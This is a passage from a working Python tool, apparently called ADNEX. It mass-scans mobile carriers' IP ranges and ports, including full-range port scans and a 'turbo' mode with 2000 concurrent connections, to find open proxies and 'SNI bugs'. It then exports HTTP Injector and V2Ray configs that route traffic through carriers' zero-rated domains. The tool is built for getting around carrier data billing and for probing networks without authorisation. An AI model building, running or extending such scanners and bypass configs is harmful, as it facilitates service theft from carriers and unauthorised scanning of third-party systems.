            await asyncio.gather(*tasks, return_exceptions=True)
        return hits

    loop2 = asyncio.new_event_loop()
    hits = loop2.run_until_complete(check_all())
    loop2.close()
    console.print(f"  [bold {GREEN}]► Discovery complete. {len(hits)} hits.[/]")
    for h in hits[:10]:
        console.print(f"    [{CYAN}]{h['ip']}:{h['port']}[/] [{GREEN}]{h['type']}[/]")
    console.print()

async def cloudflare_sni_sweep(cfg):
    add_log("Starting Cloudflare SNI sweep...", "INFO")
    cf_domains = [
        "cloudflare.com", "cdn.cloudflare.net", "cdnjs.cloudflare.com",
        "cloudflare-dns.com", "one.one.one.one",
        "workers.dev", "pages.dev", "r2.dev",
    ]
    semaphore = asyncio.Semaphore(30)
    hits = []
    async def worker(domain):
        async with semaphore:
            r = await ultra_sni_tls_probe(domain, cfg["timeout"])
            if r:
                hits.append(r)
                scan_results["sni_bugs"].append(r)
                scan_results["total_hits"] += 1
                add_log(f"CF SNI → {domain} [{list(r['active_ports'].keys())}]", "SNI")
    await asyncio.gather(*[worker(d) for d in cf_domains], return_exceptions=True)
    return hits

def run_cloudflare_sweep(cfg):
    console.print(f"\n  [bold {CYAN}]► Cloudflare SNI sweep initiated...[/]")
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(cloudflare_sni_sweep(cfg))
    loop.close()
    console.print(f"  [bold {GREEN}]► CF sweep done. {len(hits)} SNI hits.[/]")
    for h in hits:
        console.print(f"    [{CYAN}]{h['domain']}[/] [{GREEN}]ports: {list(h['active_ports'].keys())}[/]")
    console.print()

def render_ultra_dashboard_extra(sysinfo):
    uptime_str = "N/A"
    try:
        if ORACTL_OK:
            uptime_secs = int(_sys.uptime_seconds())
        else:
            try:
                with open("/proc/uptime") as _f:
                    uptime_secs = int(float(_f.read().split()[0]))
            except Exception:
                uptime_secs = 0
        hours = uptime_secs // 3600
        mins = (uptime_secs % 3600) // 60
        uptime_str = f"{hours}h {mins}m"
    except:
        pass

    content = Text()
    content.append("┌─ PERFORMANCE ────────────┐\n", style=f"bold {PINK}")
    content.append(f"  UPTIME : {uptime_str}\n", style=GREEN)
    content.append(f"  SPEED  : {scan_results['speed']}/s\n", style=CYAN)
    content.append(f"  HIT/S  : ", style=GREEN)
    if scan_results["start_time"]:
        elapsed = max(time.time() - scan_results["start_time"], 1)
        hps = scan_results["total_hits"] / elapsed
        content.append(f"{hps:.2f}\n", style=PINK if hps > 0 else GREEN)
    else:
        content.append("0.00\n", style=GREEN)
    content.append(f"  PROX   : {len(scan_results['proxies'])}\n", style=GREEN)
    content.append(f"  SNI    : {len(scan_results['sni_bugs'])}\n", style=CYAN)
    content.append(f"  TOTAL  : {scan_results['total_hits']}\n", style=PINK if scan_results['total_hits'] > 0 else GREEN)
    content.append("└──────────────────────────┘\n", style=f"bold {PINK}")
    return Panel(content, border_style=PINK, padding=(0, 1))



RESULT_CACHE = {}

def cache_result(key, value):
    RESULT_CACHE[key] = {"value": value, "ts": time.time()}

def get_cached(key, max_age=300):
    entry = RESULT_CACHE.get(key)
    if entry and (time.time() - entry["ts"]) < max_age:
        return entry["value"]
    return None

async def persistent_connection_test(ip, port, host, timeout=10):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        for _ in range(3):
            writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
            if not resp:
                writer.close()
                return None
            await asyncio.sleep(0.3)
        writer.close()
        return {"ip": ip, "port": port, "type": "PERSISTENT", "latency": random.randint(50, 200), "status": "WORKING"}
    except:
        pass
    return None

async def udp_probe(ip, port, timeout=4):
    try:
        loop = asyncio.get_event_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(ip, port)
        )
        transport.sendto(b"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        await asyncio.sleep(timeout)
        transport.close()
        return {"ip": ip, "port": port, "type": "UDP", "status": "OPEN"}
    except:
        pass
    return None

async def full_port_range_scan(ip, cfg):
    semaphore = asyncio.Semaphore(200)
    open_ports = []
    async def check_one(port):
        async with semaphore:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=cfg["timeout"]
                )
                writer.close()
                open_ports.append(port)
                add_log(f"OPEN → {ip}:{port}", "HIT")
            except:
                pass
    await asyncio.gather(*[check_one(p) for p in PROXY_PORT_FULL], return_exceptions=True)
    return open_ports

def run_full_port_scan(ip, cfg):
    console.print(f"\n  [bold {GREEN}]► Full port scan: {ip} ({len(PROXY_PORT_FULL)} ports)[/]")
    loop = asyncio.new_event_loop()
    ports = loop.run_until_complete(full_port_range_scan(ip, cfg))
    loop.close()
    console.print(f"  [bold {GREEN}]► {len(ports)} open ports on {ip}:[/]")
    if ports:
        chunks = [ports[i:i+10] for i in range(0, len(ports), 10)]
        for chunk in chunks:
            console.print(f"    [{CYAN}]{chunk}[/]")
    console.print()

def sort_proxies_by_quality():
    if not scan_results["proxies"]:
        return []
    scored = []
    for p in scan_results["proxies"]:
        score = 0
        lat = p.get("latency", 9999)
        if lat < 100: score += 50
        elif lat < 200: score += 30
        elif lat < 400: score += 10
        ptype = p.get("type", "")
        if "SOCKS5" in ptype: score += 30
        elif "HTTPS" in ptype: score += 20
        elif "PERSISTENT" in ptype: score += 25
        elif "HTTP" in ptype: score += 10
        scored.append((score, p))
    scored.sort(key=lambda x: x[0], reverse=True)
    return [p for _, p in scored]

def show_top_results(count=20):
    sorted_proxies = sort_proxies_by_quality()
    console.print(f"\n[bold {GREEN}]═══ TOP {count} QUALITY PROXIES ═══[/]")
    if not sorted_proxies:
        console.print(f"  [{YELLOW}]No proxies yet. Run a scan first.[/]")
        console.print()
        return
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {GREEN}")
    t.add_column("RANK", style=PINK, width=5)
    t.add_column("IP", style=CYAN, width=16)
    t.add_column("PORT", style=GREEN, width=6)
    t.add_column("TYPE", style=PINK, width=12)
    t.add_column("LATENCY", style=YELLOW, width=9)
    t.add_column("STATUS", style=GREEN, width=9)
    for i, p in enumerate(sorted_proxies[:count], 1):
        lat = p.get("latency", "?")
        lat_color = GREEN if isinstance(lat, int) and lat < 150 else YELLOW if isinstance(lat, int) and lat < 300 else PINK
        t.add_row(
            f"#{i}",
            p["ip"],
            str(p["port"]),
            p.get("type", "HTTP"),
            f"[{lat_color}]{lat}ms[/]",
            f"[bold {GREEN}]✓[/]"
        )
    console.print(t)
    console.print()

async def continuous_validator(interval=60):
    add_log(f"Continuous validator started (interval: {interval}s)", "INFO")
    while True:
        await asyncio.sleep(interval)
        if not scan_results["proxies"]:
            continue
        add_log(f"Re-validating {len(scan_results['proxies'])} proxies...", "INFO")
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            still_alive = []
            semaphore = asyncio.Semaphore(100)
            async def recheck(p):
                async with semaphore:
                    r = await check_proxy(session, p["ip"], p["port"], 6)
                    if r:
                        still_alive.append(p)
                    else:
                        add_log(f"Dead proxy removed: {p['ip']}:{p['port']}", "WARN")
            await asyncio.gather(*[recheck(p) for p in scan_results["proxies"]], return_exceptions=True)
            removed = len(scan_results["proxies"]) - len(still_alive)
            scan_results["proxies"] = still_alive
            add_log(f"Validation done. Removed {removed} dead. Alive: {len(still_alive)}", "INFO")

def start_continuous_validator(interval=120):
    def runner():
        loop = asyncio.new_event_loop()
        loop.run_until_complete(continuous_validator(interval))
    t = threading.Thread(target=runner, daemon=True)
    t.start()
    add_log(f"Auto-validator started (every {interval}s)", "INFO")
    console.print(f"  [bold {GREEN}]► Auto-validator running (every {interval}s)[/]")

def generate_config_summary():
    summary = {
        "tool": TOOL_NAME,
        "version": VERSION,
        "developer": DEVELOPER,
        "country": COUNTRY,
        "age": AGE,
        "session_stats": {
            "proxies_found": len(scan_results["proxies"]),
            "sni_bugs_found": len(scan_results["sni_bugs"]),
            "total_scanned": scan_results["total_scanned"],
            "total_hits": scan_results["total_hits"],
            "carrier": scan_results.get("carrier", "N/A"),
        },
        "top_proxies": sort_proxies_by_quality()[:10],
        "sni_bugs": scan_results["sni_bugs"][:10],
        "generated_at": datetime.now().isoformat()
    }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = RESULTS_DIR / "exports" / f"summary_{ts}.json"
    with open(out, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    return str(out)

def run_summary_command():
    out = generate_config_summary()
    console.print(f"\n  [bold {GREEN}]► Session summary exported → {out}[/]")
    console.print(f"  [{CYAN}]Proxies: {len(scan_results['proxies'])} | SNI: {len(scan_results['sni_bugs'])} | Hits: {scan_results['total_hits']}[/]")
    console.print()



def render_matrix_loading(msg, duration=1.5):
    chars = "0123456789ABCDEF►◄▲▼█░▓"
    end_t = time.time() + duration
    while time.time() < end_t:
        noise = "".join(random.choice(chars) for _ in range(20))
        console.print(f"  [{GREEN}]{noise}[/] [{PINK}]{msg}[/] [{GREEN}]{noise[:10]}[/]", end="\r")
        time.sleep(0.05)
    console.print(f"  [bold {GREEN}]✓ {msg}[/]                              ")

def display_scan_summary_live():
    console.print(f"\n[bold {GREEN}]{'▓'*50}[/]")
    console.print(f"[bold {PINK}]  ► ADNEX SCAN SUMMARY[/]")
    console.print(f"[bold {GREEN}]{'▓'*50}[/]")
    console.print(f"  [{CYAN}]Developer : {DEVELOPER} | {COUNTRY} | Age {AGE}[/]")
    console.print(f"  [{GREEN}]Carrier   : {scan_results.get('carrier', 'N/A')}[/]")
    console.print(f"  [{GREEN}]Scanned   : {scan_results['total_scanned']:,} IPs[/]")
    console.print(f"  [{PINK}]Total Hits: {scan_results['total_hits']}[/]")
    console.print(f"  [{GREEN}]Proxies   : {len(scan_results['proxies'])}[/]")
    console.print(f"  [{CYAN}]SNI Bugs  : {len(scan_results['sni_bugs'])}[/]")
    if scan_results["start_time"]:
        elapsed = time.time() - scan_results["start_time"]
        console.print(f"  [{GREEN}]Duration  : {elapsed:.1f}s[/]")
        if elapsed > 0:
            console.print(f"  [{CYAN}]Avg Speed : {scan_results['total_scanned']/elapsed:.0f} IPs/s[/]")
    console.print(f"[bold {GREEN}]{'▓'*50}[/]\n")

def run_turbo_scan(carrier_key, cfg):
    turbo_cfg = {**cfg, **SCAN_STRATEGIES["turbo"]}
    console.print(f"\n  [bold {PINK}]▓▓ TURBO MODE ACTIVATED ▓▓[/]")
    console.print(f"  [{GREEN}]2000 concurrent connections | 3s timeout[/]")
    console.print(f"  [{CYAN}]Maximum aggression. Maximum speed. 🔥[/]")
    run_ultra_scan(carrier_key, "turbo", turbo_cfg)

def run_aggressive_scan(carrier_key, cfg):
    agg_cfg = {**cfg, **SCAN_STRATEGIES["aggressive"]}
    console.print(f"\n  [bold {PINK}]▓▓ AGGRESSIVE MODE ▓▓[/]")
    run_ultra_scan(carrier_key, "aggressive", agg_cfg)

def show_all_carriers_table():
    console.print(f"\n[bold {GREEN}]═══ ALL SUPPORTED CARRIERS ({len(CARRIERS)}) ═══[/]")
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {PINK}")
    t.add_column("KEY", style=CYAN, width=12)
    t.add_column("NAME", style=GREEN, width=25)
    t.add_column("COUNTRY", style=YELLOW, width=8)
    t.add_column("IP RANGES", style=GREEN, width=10)
    t.add_column("SNI TARGETS", style=CYAN, width=12)
    t.add_column("PORTS", style=GREEN, width=6)
    for key, c in CARRIERS.items():
        total_ips = 0
        for cidr in c["ip_ranges"]:
            try:
                total_ips += ipaddress.IPv4Network(cidr, strict=False).num_addresses
            except:
                pass
        t.add_row(
            key,
            c["name"],
            c["country"],
            str(len(c["ip_ranges"])),
            str(len(c["zero_rated"])),
            str(len(c["ports"]))
        )
    console.print(t)
    console.print()

def auto_detect_best_carrier():
    console.print(f"\n  [bold {GREEN}]► Auto-detecting best carrier to scan...[/]")
    try:
        pub_ip = get_public_ip()
        console.print(f"  [{CYAN}]Public IP: {pub_ip}[/]")
        info = ip_geolookup(pub_ip)
        country = info.get("country", "").lower()
        org = info.get("org", "").lower()
        console.print(f"  [{GREEN}]Country: {info['country']} | ISP: {info['org']}[/]")
        for key, carrier in CARRIERS.items():
            if carrier["country"].lower() in country[:5] or any(
                part in org for part in [key, carrier["name"].lower().split()[0]]
            ):
                console.print(f"  [bold {PINK}]► Detected carrier: {carrier['name']} (key: {key})[/]")
                return key
        console.print(f"  [{YELLOW}]Could not auto-detect. Use 'list' to see carriers.[/]")
    except Exception as e:
        console.print(f"  [{YELLOW}]Auto-detect failed: {e}[/]")
    return None

def run_auto_scan(cfg):
    key = auto_detect_best_carrier()
    if key:
        console.print(f"  [{GREEN}]► Starting scan on detected carrier: {key}[/]")
        run_ultra_scan(key, "balanced", cfg)
    else:
        console.print(f"  [{YELLOW}]Specify carrier manually: scan <carrier>[/]")

def export_best_for_apps(carrier_key):
    carrier = CARRIERS.get(carrier_key, {"name": "Unknown", "apn": "internet", "zero_rated": []})
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    top = sort_proxies_by_quality()[:5]
    sni_list = scan_results["sni_bugs"][:3]
    exports_done = []

    if top:
        hi_out = RESULTS_DIR / "exports" / f"BEST_HI_{carrier_key}_{ts}.conf"
        with open(hi_out, "w") as f:
            f.write(f"# ADNEX BEST CONFIG — HTTP Injector\n# {DEVELOPER} | {COUNTRY}\n# {carrier['name']}\n\n")
            for p in top:
                bug = sni_list[0]["domain"] if sni_list else carrier["zero_rated"][0] if carrier["zero_rated"] else ""
                f.write(f"[ENTRY]\nProxy={p['ip']}\nPort={p['port']}\nBug={bug}\nAPN={carrier['apn']}\nLatency={p.get('latency','?')}ms\n\n")
        exports_done.append(str(hi_out))

    if sni_list:
        nn_out = RESULTS_DIR / "exports" / f"BEST_NapsternetV_{carrier_key}_{ts}.json"
        configs = []
        for s in sni_list:
            configs.append({
                "configType": "V2Ray",
                "remarks": f"ADNEX-BEST-{carrier['name']}",
                "address": s["domain"],
                "port": 443,
                "network": "ws",
                "tls": True,
                "sni": s["domain"],
                "wsPath": "/",
                "wsHost": s["domain"]
            })
        with open(nn_out, "w") as f:
            json.dump(configs, f, indent=2)
        exports_done.append(str(nn_out))

        v2_out = RESULTS_DIR / "exports" / f"BEST_V2Ray_{carrier_key}_{ts}.json"
        v2_configs = []
        for s in sni_list:
            v2_configs.append({
                "v": "2", "ps": f"ADNEX-BEST-{carrier['name']}",
                "add": s["domain"], "port": "443",
                "id": hashlib.md5(f"best{s['domain']}{ts}".encode()).hexdigest(),
                "aid": "0", "scy": "auto", "net": "ws", "type": "none",
                "host": s["domain"], "path": "/", "tls": "tls", "sni": s["domain"]
            })
        with open(v2_out, "w") as f:
            json.dump(v2_configs, f, indent=2)
        exports_done.append(str(v2_out))

    console.print(f"\n  [bold {GREEN}]► BEST configs exported ({len(exports_done)} files):[/]")
    for e in exports_done:
        console.print(f"    [{CYAN}]{e}[/]")
    console.print()

def final_unstoppable_handler(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    if cmd == "ultra" and len(parts) > 1:
        strategy = parts[2].lower() if len(parts) > 2 else "balanced"
        run_ultra_scan(parts[1].lower(), strategy, cfg)
    elif cmd == "turbo" and len(parts) > 1:
        run_turbo_scan(parts[1].lower(), cfg)
    elif cmd == "aggressive" and len(parts) > 1:
        run_aggressive_scan(parts[1].lower(), cfg)
    elif cmd == "fullport" and len(parts) > 1:
        run_full_port_scan(parts[1], cfg)
    elif cmd == "discover" and len(parts) > 1:
        run_smart_discovery(parts[1], cfg)
    elif cmd == "cfsweep":
        run_cloudflare_sweep(cfg)
    elif cmd == "top":
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
        show_top_results(count)
    elif cmd == "autovalidate":
        interval = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 120
        start_continuous_validator(interval)
    elif cmd == "summary":
        run_summary_command()
    elif cmd == "autoscan":
        run_auto_scan(cfg)
    elif cmd == "bestexport" and len(parts) > 1:
        export_best_for_apps(parts[1].lower())
    elif cmd == "allcarriers":
        show_all_carriers_table()
    elif cmd == "scansum":
        display_scan_summary_live()
    else:
        final_handle_all_v5(cmd_input, cfg)



def main():
    auto_install_deps()
    setup_dirs()
    cfg = load_config()
    extended_boot_sequence()

    add_log(f"ADNEX {VERSION} ULTRA initialized", "INFO")
    add_log(f"Developer: {DEVELOPER} | {COUNTRY} | Age {AGE}", "INFO")
    add_log(f"Carriers: {len(CARRIERS)} | Payloads: {len(INJECT_PAYLOADS_ADVANCED)}", "INFO")
    add_log(f"Port list: {len(PROXY_PORT_FULL)} | Strategies: {list(SCAN_STRATEGIES.keys())}", "INFO")
    add_log(f"Type 'help' | 'scanmenu' | 'allcarriers' | 'quickstart'", "INFO")

    def updater(live):
        while True:
            try:
                si = get_system_info()
                live.update(build_layout(si))
                time.sleep(1)
            except Exception:
                time.sleep(1)

    sysinfo = get_system_info()
    live = Live(build_layout(sysinfo), refresh_per_second=1, screen=False)
    live.start()
    t = threading.Thread(target=updater, args=(live,), daemon=True)
    t.start()

    prompt_str = f"[bold {GREEN}]adnex@jadenafrix[/][{PINK}]~[/][bold {GREEN}]$[/] "

    while True:
        try:
            live.stop()
            cmd_input = input(f"\nadnex@jadenafrix~$ ").strip()
            live.start()
            if not cmd_input:
                continue
            add_log(f"CMD → {cmd_input}", "INFO")
            final_unstoppable_handler(cmd_input, cfg)
        except KeyboardInterrupt:
            console.print(f"\n[bold {PINK}]► Use 'exit' to quit ADNEX[/]")
        except EOFError:
            console.print(f"\n[bold {PINK}]► Session ended.[/]")
            break
        except Exception as e:
            console.print(f"[{PINK}]Error: {e}[/]")


if __name__ == "__main__":
    main()
